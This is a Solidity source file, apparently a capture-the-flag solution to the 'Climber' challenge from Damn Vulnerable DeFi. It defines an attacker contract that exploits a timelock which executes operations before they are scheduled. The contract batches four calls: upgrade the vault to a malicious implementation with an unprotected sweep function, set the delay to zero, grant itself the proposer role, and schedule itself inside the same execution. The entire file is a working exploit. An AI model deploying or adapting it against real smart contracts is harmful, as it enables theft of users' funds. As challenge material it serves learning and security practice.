// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Ownable2Step} from "@openzeppelin/contracts/access/Ownable2Step.sol";

import {PROPOSER_ROLE} from "./ClimberConstants.sol";
import {IClimberTimelock} from "./IClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";
import {ClimberVaultMalicious} from "./ClimberVaultMalicious.sol";

contract ClimberVaultAttacker is Ownable2Step {
    IClimberTimelock private immutable i_climberTimelock;
    ClimberVault private immutable i_climberVault;

    address[] private s_targets;
    uint256[] private s_values;
    bytes[] private s_dataElements;

    constructor(
        address _climberTimelock,
        address _climberVault
    ) Ownable2Step() {
        i_climberTimelock = IClimberTimelock(payable(_climberTimelock));
        i_climberVault = ClimberVault(_climberVault);

        // NB: replaces the vault implementation with a modified one (`sweeFunds()` without access controls)
        ClimberVaultMalicious climberVaultMalicious = new ClimberVaultMalicious();

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        // 1. Replace the implementation leveraging the timelock ownership
        targets[0] = _climberVault;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
            i_climberVault.upgradeTo.selector,
            address(climberVaultMalicious)
        );

        // 2. Set the delay to 0
        targets[1] = _climberTimelock;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            i_climberTimelock.updateDelay.selector,
            0
        );

        // 3. Grant this contract with PROPOSER_ROLE so it can schedule tasks
        targets[2] = _climberTimelock;
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            i_climberTimelock.grantRole.selector,
            PROPOSER_ROLE,
            address(this)
        );

        // 4. Include all these tasks to get the right operation ID
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("scheduleWrapper()");

        s_targets = targets;
        s_values = values;
        s_dataElements = dataElements;
    }

    function exploit() external onlyOwner {
        i_climberTimelock.execute(s_targets, s_values, s_dataElements, "");
    }

    // NB: addresses the `dataElements` arg recursivity problem, which has to include itself
    function scheduleWrapper() external {
        i_climberTimelock.schedule(s_targets, s_values, s_dataElements, "");
    }
}
